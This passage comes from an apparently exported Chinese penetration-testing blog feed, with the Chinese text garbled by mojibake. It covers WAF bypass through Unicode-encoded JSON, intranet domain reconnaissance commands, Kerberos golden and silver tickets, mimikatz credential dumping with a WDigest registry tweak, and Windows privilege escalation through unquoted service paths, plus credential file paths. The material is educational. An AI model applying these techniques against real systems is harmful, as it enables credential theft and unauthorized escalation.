alt="image-20221021205739631"></p><p>è¿™æ—¶å€™å°±å¯ä»¥å°è¯•è¿›è¡ŒFlaskçš„PINç ç ´è§£</p></li></ul><h3 id="Unicodeæ¬ºéª—"><a href="#Unicodeæ¬ºéª—" class="headerlink" title="Unicodeæ¬ºéª—"></a>Unicodeæ¬ºéª—</h3><blockquote><p>åŸç†ç®€å•æ¥è¯´å°±æ˜¯å¯¹å­—ç¬¦ä¸²çš„æ ‡å‡†åŒ–æ“ä½œå¯¼è‡´unicodeå­—ç¬¦è½¬æ¢æˆäº†ä¸ä»–åŒå½¢çš„asciiå­—ç¬¦ã€‚</p></blockquote><p><a href="https://1idb.com/?p=642">Web åŸºäºASIS 2019ï¼šUnicorn shopå­¦ä¹ Unicodeå®‰å…¨éšæ‚£ â€“ å¤§å½ªçš„å°ç«™</a></p><p>æŸ¥è¯¢ï¼š</p><p><a href="https://unicode-table.com/cn/blocks/">https://unicode-table.com/cn/blocks/</a></p><p><a href="https://unicode-table.com/cn/sets/symbols-for-nickname/#arabic-and-roman-numerals">https://unicode-table.com/cn/sets/symbols-for-nickname/#arabic-and-roman-numerals</a></p><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p><a href="https://www.w3cschool.cn/json/28yd1mw2.html">jsonç¼–ç </a></p><blockquote><p>å­—ç¬¦ä¸²æ”¯æŒunicodeç¼–ç </p></blockquote><p><img src="/../images/image-20220725194348092.png"></p><h4 id="è¿‡æ»¤ä½ç½®å‡ºé”™"><a href="#è¿‡æ»¤ä½ç½®å‡ºé”™" class="headerlink" title="è¿‡æ»¤ä½ç½®å‡ºé”™"></a>è¿‡æ»¤ä½ç½®å‡ºé”™</h4><p>åç«¯æ¥æ”¶JSONæ•°æ®ï¼Œæ²¡æœ‰å…ˆå¯¹å…¶è¿›è¡Œè§£ç ç­‰å¤„ç†ï¼Œè€Œç›´æ¥å¯¹å…¶è¿›è¡Œæ“ä½œå¦‚åˆ¤æ–­ï¼Œè¿‡æ»¤</p><ul><li><p>è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    xxxx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">waf</span>(<span class="variable">$body</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><blockquote><p>å¯¹äºè¿™ç§æƒ…å†µï¼Œåªéœ€è¦å¯¹æäº¤çš„JSONæ•°æ®è¿›è¡ŒUNICODEç¼–ç å³å¯ç»•è¿‡wafã€‚</p></blockquote></li><li><p>åˆ¤æ–­æ¯”è¾ƒ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$numbers</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">#è·å–ajaxè¯·æ±‚çš„æ•°æ®</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;           </span><br></pre></td></tr></table></figure><blockquote><p>å°†$numbersçš„æ¯ä¸€ä½ä¸å¾…æ¯”è¾ƒæ•°å­—é€å­—æ¯”è¾ƒ</p><p>å› ä¸ºjsonæ”¯æŒæ•°ç»„å’Œå¸ƒå°”ç±»å‹çš„æ•°æ®ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ jsonæ•°æ®ä¸º{numbers:[true,true,true,true,true,true,true]}</p><p>åªè¦å¾…æ¯”è¾ƒæ•°å­—$win_numbersçš„æ¯ä¸€ä½éƒ½å¤§äº0ï¼Œå³å¯è¾“å‡ºflag</p></blockquote></li></ul><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.w3school.com.cn/charsets/index.asp">HTMLå­—ç¬¦é›† (w3school.com.cn)</a></p><p><a href="https://cloud.tencent.com/developer/article/1748394">30ä½™ç§åŠ å¯†ç¼–ç ç±»å‹çš„å¯†æ–‡ç‰¹å¾åˆ†æï¼ˆå»ºè®®æ”¶è—ï¼‰ - äº‘+ç¤¾åŒº - è…¾è®¯äº‘ (tencent.com)</a></p><p><a href="https://segmentfault.com/a/1190000019437999">pythonä¸­çš„ç¼–ç </a></p>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœºåŸºç¡€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åæ¸—é€ä¹‹å†…ç½‘ä¿¡æ¯æ”¶é›†</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"><a href="#åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ" class="headerlink" title="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"></a>åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230320152802672-1693107475017.png" alt="image-20230320152802672"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr åŸŸ</span><br><span class="line">systeminfo | findstr Domain</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230320152858151-1693107475019.png" alt="image-20230320152858151"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net config workstation | findstr åŸŸ</span><br><span class="line">net config workstation | findstr Domain</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230320153121788-1693107475019.png" alt="image-20230320153121788"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><ul><li>å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·</li></ul><p><img src="/../images/6-1694794044688.png" alt="6"></p><ul><li><p>å­˜åœ¨åŸŸï¼Œä¸”å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·</p><p><img src="/../images/5-1694794093177.png" alt="5"></p></li><li><p>å½“å‰ç½‘ç»œç¯å¢ƒä¸ºå·¥ä½œç»„ï¼Œæç¤ºä¸å­˜åœ¨åŸŸ</p><p><img src="/../images/7-1694794120868.png" alt="7"></p></li></ul><h1 id="å®šä½åŸŸæ§"><a href="#å®šä½åŸŸæ§" class="headerlink" title="å®šä½åŸŸæ§"></a>å®šä½åŸŸæ§</h1><h1 id="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"><a href="#æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº" class="headerlink" title="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"></a>æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº</h1><ul><li><p>Fscan</p></li><li><p>ARP-SCAN</p></li><li><p>pingå‘½ä»¤</p></li></ul><h1 id="æ¢æµ‹å­˜æ´»ä¸»æœºç«¯å£"><a href="#æ¢æµ‹å­˜æ´»ä¸»æœºç«¯å£" class="headerlink" title="æ¢æµ‹å­˜æ´»ä¸»æœºç«¯å£"></a>æ¢æµ‹å­˜æ´»ä¸»æœºç«¯å£</h1><ul><li>Fscan</li><li>Telnet </li><li>nc</li></ul><h1 id="å®šä½åŸŸç®¡ç†å‘˜"><a href="#å®šä½åŸŸç®¡ç†å‘˜" class="headerlink" title="å®šä½åŸŸç®¡ç†å‘˜"></a>å®šä½åŸŸç®¡ç†å‘˜</h1>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åæ¸—é€ä¹‹åŸºç¡€çŸ¥è¯†</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><h2 id="å·¥ä½œç»„ä¸åŸŸ"><a href="#å·¥ä½œç»„ä¸åŸŸ" class="headerlink" title="å·¥ä½œç»„ä¸åŸŸ"></a>å·¥ä½œç»„ä¸åŸŸ</h2><p><a href="https://apt404.github.io/2016/08/10/workgroup-domain-dc/">å·¥ä½œç»„,åŸŸ,åŸŸæ§æ˜¯ä»€ä¹ˆåŠå®ƒä»¬ä¹‹é—´çš„ä¸€äº›å…³ç³» | APT404-ä¸ä½œæ¶</a></p><blockquote><p>  å·¥ä½œç»„å°±æ˜¯æŠŠä¸€äº›å…·æœ‰ç›¸åŒèŒèƒ½(æ¯”å¦‚,å¯ä»¥æŒ‰éƒ¨é—¨,æŒ‰æˆ¿é—´å·,æŒ‰å²—ä½,æŒ‰æ“ä½œç³»ç»Ÿç±»å‹ç­‰çš„ä¸åŒè¿›è¡Œåˆ†ç»„ç®¡ç†)çš„æœºå™¨éƒ½æ”¾åˆ°ä¸€ä¸ªç»„é‡Œã€‚</p><p>  å®é™…ä¸Šå·¥ä½œç»„åªæ˜¯å½¢å¼ä¸Šçš„æŠŠå¤§å®¶æ”¾åœ¨äº†ä¸€èµ·è€Œå·²,å¹¶ä¸å­˜åœ¨çœŸæ­£çš„é›†ä¸­ç®¡ç†ä½œç”¨,å·¥ä½œç»„å†…çš„æ¯å°æœºå™¨ä¾ç„¶æ˜¯ç›¸äº’ç‹¬ç«‹,äº’ä¸å¹²æ¶‰,å„è‡ªä¸ºæ”¿çš„ã€‚å¦‚æœè¦è®¿é—®å·¥ä½œç»„ä¸­å…¶ä»–ä¸»æœºçš„èµ„æºï¼Œéœ€è¦æä¾›è¯¥ä¸»æœºçš„è´¦å·å¯†ç ã€‚</p><p>  åŸŸï¼Œé€šè¿‡åŸŸç®¡ç†å‘˜ç®¡ç†åŸŸæ§ï¼ˆDCï¼‰æ¥å¯¹åŸŸå†…ä¸»æœºè¿›è¡Œç®¡ç†ï¼Œè¦æƒ³è®¿é—®åŸŸå†…ä¸»æœºèµ„æºï¼Œå°±è¦æˆä¸ºåŸŸå†…ç”¨æˆ·ï¼Œå¹¶å—é™äºèº«ä»½ã€‚</p><p>  åŸŸç®¡ç†å‘˜å¯ä»¥ä»»æ„æ“ä½œåŸŸå†…çš„ä»»æ„ä¸€å°ä¸»æœºï¼ˆå½“ä¸»æœºåŠ å…¥åŸŸä¸­æ—¶ï¼ŒåŸŸæ§å°±ä¼šå‘è¯¥ä¸»æœºçš„æœ¬åœ°ç®¡ç†ç»„ä¸­åŠ å…¥åŸŸç®¡ç†å‘˜è´¦æˆ·ï¼‰</p><p>  åŸŸæ§æœåŠ¡å™¨ä¸Šçš„ç”¨æˆ·é»˜è®¤ä¸ºåŸŸç”¨æˆ·</p><p>  ADï¼ˆ Active Directory ï¼‰ï¼šä¿å­˜åŸŸç”¨æˆ·èº«ä»½å‡­è¯</p></blockquote><h2 id="Windowsèº«ä»½è®¤è¯æœºåˆ¶"><a href="#Windowsèº«ä»½è®¤è¯æœºåˆ¶" class="headerlink" title="Windowsèº«ä»½è®¤è¯æœºåˆ¶"></a>Windowsèº«ä»½è®¤è¯æœºåˆ¶</h2><p><a href="https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/">åŸŸæ¸—é€å­¦ä¹ ï¼ˆä¸€ï¼‰Windowsè®¤è¯æœºåˆ¶ | AresXâ€™s Blog</a></p><h3 id="æœ¬åœ°è®¤è¯"><a href="#æœ¬åœ°è®¤è¯" class="headerlink" title="æœ¬åœ°è®¤è¯"></a>æœ¬åœ°è®¤è¯</h3><blockquote><p>æŒ‡ç”¨æˆ·ç›´æ¥æ“ä½œè®¡ç®—æœºç™»é™†è´¦æˆ·</p></blockquote><p>![image-20230331000339946](E:\typora img\image-20230331000339946.png)</p><p>æœ¬åœ°è®¤è¯ä¸­ç”¨æ¥å¤„ç†ç”¨æˆ·è¾“å…¥å¯†ç çš„è¿›ç¨‹å³lsass.exe,å¯†ç ä¼šåœ¨è¿™ä¸ªè¿›ç¨‹ä¸­æ˜æ–‡ä¿å­˜ï¼Œä¾›è¯¥è¿›ç¨‹å°†å¯†ç è®¡ç®—æˆNTLM Hashä¸samè¿›è¡Œæ¯”å¯¹ã€‚æˆ‘ä»¬ä½¿ç”¨mimikatzæ¥è·å–çš„æ˜æ–‡å¯†ç ï¼Œä¾¿æ˜¯åœ¨è¿™ä¸ªè¿›ç¨‹ä¸­è¯»å–åˆ°çš„</p><h3 id="ç½‘ç»œè®¤è¯netNTLM"><a href="#ç½‘ç»œè®¤è¯netNTLM" class="headerlink" title="ç½‘ç»œè®¤è¯netNTLM"></a>ç½‘ç»œè®¤è¯netNTLM</h3><p>æŒ‘æˆ˜å“åº”æœºåˆ¶</p><p>![image-20230601124340615](E:\typora img\image-20230601124340615.png)</p><h3 id="åŸŸè®¤è¯â€“Kerberosåè®®"><a href="#åŸŸè®¤è¯â€“Kerberosåè®®" class="headerlink" title="åŸŸè®¤è¯â€“Kerberosåè®®"></a>åŸŸè®¤è¯â€“Kerberosåè®®</h3><p><a href="https://ares-x.com/2020/03/17/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89Kerberos%E5%8D%8F%E8%AE%AE/">åŸŸæ¸—é€å­¦ä¹ ï¼ˆäºŒï¼‰Kerberosåè®® | AresXâ€™s Blog</a></p><p>![image-20230330213515103](E:\typora img\image-20230330213515103.png)</p><p>å‚ä¸è®¤è¯çš„ä¸‰ä¸ªè§’è‰²çš„NTLM Hashæ˜¯ä¸‰ä¸ªå¯†é’¥ï¼Œè¿™ä¸‰ä¸ªNTLM Hashçš„å”¯ä¸€ä½œç”¨æ˜¯ç¡®ä¿ä¼šè¯å¯†é’¥Sessionkeyçš„å®‰å…¨ä¼ è¾“</p><h4 id="éªŒè¯èº«ä»½"><a href="#éªŒè¯èº«ä»½" class="headerlink" title="éªŒè¯èº«ä»½"></a>éªŒè¯èº«ä»½</h4><p>æ”¶åˆ°ä¸¤ä¸ªæ¶ˆæ¯ï¼Œéƒ½æ˜¯å…ˆç”¨è‡ªå·±çš„NTLMå“ˆå¸Œè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°ä¼šè¯å¯†é’¥å’Œcilent idï¼Œæ—¶é—´æˆ³ï¼Œå†ç”¨ä¼šè¯å¯†é’¥å¯¹å¦ä¸€ä¸ªæ¶ˆæ¯è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°å¦ä¸€ç»„cilent idå’Œæ—¶é—´æˆ³ï¼Œå°†è§£å¯†å¾—åˆ°çš„è¿™ä¸¤ç»„cilent idå’Œæ—¶é—´æˆ³è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒï¼Œåˆ™éªŒè¯æˆåŠŸã€‚</p><h4 id="é»„é‡‘ç¥¨æ®TGT-Ticket-Granting-Ticket"><a href="#é»„é‡‘ç¥¨æ®TGT-Ticket-Granting-Ticket" class="headerlink" title="é»„é‡‘ç¥¨æ®TGT(Ticket Granting Ticket)"></a>é»„é‡‘ç¥¨æ®TGT(Ticket Granting Ticket)</h4><blockquote><p>ç”¨äºèº«ä»½è®¤è¯ï¼Œå­˜å‚¨åœ¨å†…å­˜ï¼Œé»˜è®¤æœ‰æ•ˆæœŸä¸º10å°æ—¶</p></blockquote><p>å†…å®¹ä¸º<strong>Client&#x2F;TGS Sessionkey</strong>å’Œ<strong>cilent idï¼Œæ—¶é—´æˆ³</strong>ï¼Œç”±KDCä¸­çš„ASç”¨<strong>KDCå¯†é’¥ï¼ˆå³TGSå¯†é’¥&#x2F;KDCæœåŠ¡å™¨krbtgtç”¨æˆ·çš„NTLM Hashï¼‰</strong>åŠ å¯†å¾—åˆ°</p><p>ï¼ˆå‘KDCè¯·æ±‚èº«ä»½è®¤è¯ï¼Œæ‰€ä»¥ç”¨KDCå¯†é’¥åŠ å¯†ï¼‰</p><h4 id="ç™½é“¶ç¥¨æ®TGS-Ticket-Granting-Server"><a href="#ç™½é“¶ç¥¨æ®TGS-Ticket-Granting-Server" class="headerlink" title="ç™½é“¶ç¥¨æ®TGS(Ticket Granting Server)"></a>ç™½é“¶ç¥¨æ®TGS(Ticket Granting Server)</h4><p>å†…å®¹ä¸º<strong>Client&#x2F;Server Sessionkey</strong>å’Œ<strong>cilent idï¼Œæ—¶é—´æˆ³</strong>,ç”±KDCä¸­çš„TGSç”¨**Serverå¯†é’¥(æœåŠ¡å™¨çš„NTLMHASH)**åŠ å¯†å¾—åˆ°</p><p>ï¼ˆå‘Serverè¯·æ±‚æœåŠ¡ï¼Œæ‰€ä»¥ç”¨Serverå¯†é’¥åŠ å¯†ï¼‰</p><p>äºŒè€…åŒºåˆ«</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»„é‡‘ç¥¨æ®ï¼Œè·å–KDCç”¨æˆ·ï¼ˆkrbtgç”¨æˆ·çš„hashå€¼ï¼‰å°±å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·çš„é»„é‡‘ç¥¨æ®ä»è€Œå®ç°å¯¹åŸŸå†…ä»»æ„æœºå™¨çš„ä¸€ä¸ªè®¿é—®ã€‚</span><br><span class="line"></span><br><span class="line">ç™½é“¶ç¥¨æ®ï¼Œå½“è·å–åˆ°åŸŸå†…æœºå™¨ç”¨æˆ·çš„hashå€¼å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ªçœŸæ­£çš„ç™½é“¶ç¥¨æ®ã€‚å®ç°å¯¹æŸä¸ªæœºå™¨ç‰¹å®šæœåŠ¡çš„è®¿é—®ã€‚</span><br><span class="line"></span><br><span class="line">ä»–ä»¬ä¸¤ä¸ªåŒºåˆ«å°±åœ¨é»„é‡‘ç¥¨æ®ä½œç”¨æ›´å¤§è·å¾—TGTç¥¨æ®åå¯ä»¥è®¿é—®ä»»æ„æœºå™¨ä»»æ„æœåŠ¡ï¼Œç™½é“¶åªèƒ½æŒ‡å®šæœºå™¨æŒ‡å®šæœåŠ¡ã€‚</span><br></pre></td></tr></table></figure><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p><strong>åŸç†</strong></p><p>æœ¬åœ°è®¤è¯ä¸­ç”¨æ¥å¤„ç†ç”¨æˆ·è¾“å…¥å¯†ç çš„è¿›ç¨‹å³lsass.exe,å¯†ç ä¼šåœ¨è¿™ä¸ªè¿›ç¨‹ä¸­æ˜æ–‡ä¿å­˜ï¼Œä¾›è¯¥è¿›ç¨‹å°†å¯†ç è®¡ç®—æˆNTLM Hashä¸samè¿›è¡Œæ¯”å¯¹</p><p>æˆ‘ä»¬ä½¿ç”¨mimikatzæ¥è·å–çš„æ˜æ–‡å¯†ç ï¼Œä¾¿æ˜¯åœ¨è¿™ä¸ªè¿›ç¨‹ä¸­è¯»å–åˆ°çš„</p><p><strong>ä½¿ç”¨æ³¨æ„äº‹é¡¹</strong></p><p>éœ€è¦é«˜æƒé™ï¼Œå¯ä»¥å…ˆç”¨privailgeæ¨¡å—ææƒ</p><p><strong>è¡¥ä¸</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server 2012æ—¶ï¼Œlsass.exeä¸ä¿å­˜æ˜æ–‡å¯†ç ä¸ä¿å­˜æ˜æ–‡çš„å¯†ç ã€‚</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¯ç”¨Wdigest Authï¼Œå†…å­˜ä¸­è¿˜æ˜¯ä¼šä¿å­˜ç³»ç»Ÿçš„æ˜æ–‡å£ä»¤</span><br><span class="line">å°†ä¸‹åˆ—æ³¨å†Œè¡¨è·¯å¾„çš„</span><br><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</span><br><span class="line">ä»¥ä¸‹é¡¹çš„</span><br><span class="line">UseLogonCredential</span><br><span class="line">å€¼ä¿®æ”¹æˆ0æˆ–1</span><br><span class="line">0ï¼šå…³é—­Wdigest Auth</span><br><span class="line">1ï¼šå¯åŠ¨Wdigest Auth</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åæ¸—é€ä¹‹æƒé™æå‡</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<h2 id="ææƒçš„æœ¬è´¨"><a href="#ææƒçš„æœ¬è´¨" class="headerlink" title="ææƒçš„æœ¬è´¨"></a>ææƒçš„æœ¬è´¨</h2><p><strong>åˆ©ç”¨æƒé™é…ç½®çš„å¤±è¯¯</strong></p><h2 id="æ•°æ®åº“ææƒ"><a href="#æ•°æ®åº“ææƒ" class="headerlink" title="æ•°æ®åº“ææƒ"></a>æ•°æ®åº“ææƒ</h2><blockquote><p>éœ€è¦æœåŠ¡å™¨å¼€å¯æ•°æ®åº“æœåŠ¡åŠè·å–åˆ°æœ€é«˜æƒé™ç”¨æˆ·å¯†ç ã€‚</p><p>é™¤ Access æ•°æ®åº“å¤–ï¼Œå…¶ä»–æ•°æ®åº“åŸºæœ¬éƒ½å­˜åœ¨æ•°æ®åº“ææƒçš„å¯èƒ½ã€‚</p></blockquote><p><a href="https://www.sqlsec.com/2020/11/mysql.html">MYSQL å›½å…‰å¸ˆå‚…æ€»ç»“</a></p><p>UDFææƒåªèƒ½è·å¾—mysqlçš„è¿è¡Œæƒé™ï¼Œå¯¹äºlinuxç³»ç»Ÿï¼Œé»˜è®¤ç»™mysqlåˆ†é…ä¸€ä¸ªâ€mysql:mysqlâ€ç”¨æˆ·ï¼Œæ‰€ä»¥å¯¹äºlinuxç³»ç»Ÿæ¥è¯´è¿™ä¸ªç»™ææƒæ²¡å•¥æ„ä¹‰ã€‚</p><p><img src="/../images/14483f65ba5d4390940eaf054d71b0f9-1693976641900.png" alt="fs"></p><h2 id="Windowsææƒ"><a href="#Windowsææƒ" class="headerlink" title="Windowsææƒ"></a>Windowsææƒ</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p><a href="https://blog.csdn.net/fuhanghang/article/details/128786603">Windowsçš„æƒé™ï¼ˆç”¨æˆ·ã€ç»„å’Œè®¿é—®æ§åˆ¶ï¼‰_</a></p><h3 id="ç›®çš„"><a href="#ç›®çš„" class="headerlink" title="ç›®çš„"></a>ç›®çš„</h3><p>ä» Webshellã€æ•°æ®åº“æƒâ€”&gt; ç³»ç»Ÿæ™®é€šç”¨æˆ·æƒé™â€”&gt;Administrator æƒé™â€”&gt;System æƒé™</p><h3 id="æ‰‹æ³•"><a href="#æ‰‹æ³•" class="headerlink" title="æ‰‹æ³•"></a>æ‰‹æ³•</h3><p><img src="/../images/1605453393_5fb146513192ec6c15dae.png!small" alt="1605453393_5fb146513192ec6c15dae.png!small"></p><h4 id="ç³»ç»Ÿé…ç½®é”™è¯¯"><a href="#ç³»ç»Ÿé…ç½®é”™è¯¯" class="headerlink" title="ç³»ç»Ÿé…ç½®é”™è¯¯"></a>ç³»ç»Ÿé…ç½®é”™è¯¯</h4><p>å·¥å…·</p><p><a href="https://github.com/mertdas/PrivKit">mertdas&#x2F;PrivKit: PrivKit is a simple beacon object file that detects privilege escalation vulnerabilities caused by misconfigurations on Windows OS. (github.com)</a></p><p>æ£€æŸ¥æ¸…å•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Checks for Unquoted Service Paths</span><br><span class="line">Checks for Autologon Registry Keys</span><br><span class="line">Checks for Always Install Elevated Registry Keys</span><br><span class="line">Checks for Modifiable Autoruns</span><br><span class="line">Checks for Hijackable Paths</span><br><span class="line">Enumerates Credentials From Credential Manager</span><br><span class="line">Looks for current Token Privileges</span><br></pre></td></tr></table></figure><p>è¯¥å·¥å…·ä¸ºCSçš„æ’ä»¶ï¼Œå¯¼å…¥ååœ¨beaconä¸­ä½¿ç”¨</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">beacon&gt; privcheck</span><br></pre></td></tr></table></figure><h5 id="å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"><a href="#å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´" class="headerlink" title="å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"></a>å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´</h5><p><img src="/../images/20201014150247256.png" alt="img"></p><p><strong>è·¯å¾„æ²¡æœ‰åŒ…å«åœ¨å¼•å·ä¸­ï¼ŒæœåŠ¡ä¼šæŒ‰ç…§ä»¥ä¸‹é¡ºåºä¾æ¬¡æ‰§è¡Œ</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\program.exe</span><br><span class="line">c:\program files.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro expert\MacroService.exe</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° Windows å°è¯•æ‰§è¡Œäº†å››æ¬¡æ‰æ‰¾åˆ°çœŸæ­£çš„ç¨‹åºã€‚</p><p>ç”±äº Windows æœåŠ¡é€šå¸¸æ˜¯ä»¥ SYSTEM æƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥åœ¨ç³»ç»Ÿæ‰¾åˆ°ç©ºæ ¼å‰çš„ç¨‹åºå¹¶æ‰§è¡Œæ—¶ï¼Œä¹Ÿå°†ä»¥ SYSTEM æƒé™è¿è¡Œè¿™ä¸ªç¨‹åºã€‚</p><p>å³æˆ‘ä»¬æŠŠæœ¨é©¬ç¨‹åºå‘½åä¸º Program.exe ï¼Œç„¶åæ”¾åˆ° C ç›˜ä¸‹ï¼Œå½“ä¸Šé¢çš„æœåŠ¡é‡å¯æ—¶ï¼Œç³»ç»Ÿå°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„æœ¨é©¬ç¨‹åºã€‚</p><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿä¸­é”™è¯¯é…ç½®çš„è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><h5 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶</span></span><br><span class="line">C:\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># IISé…ç½®æ–‡ä»¶</span></span><br><span class="line">C:\inetpub\wwwroot\web.config</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\Config\web.config</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœç´¢å‡­è¯</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> 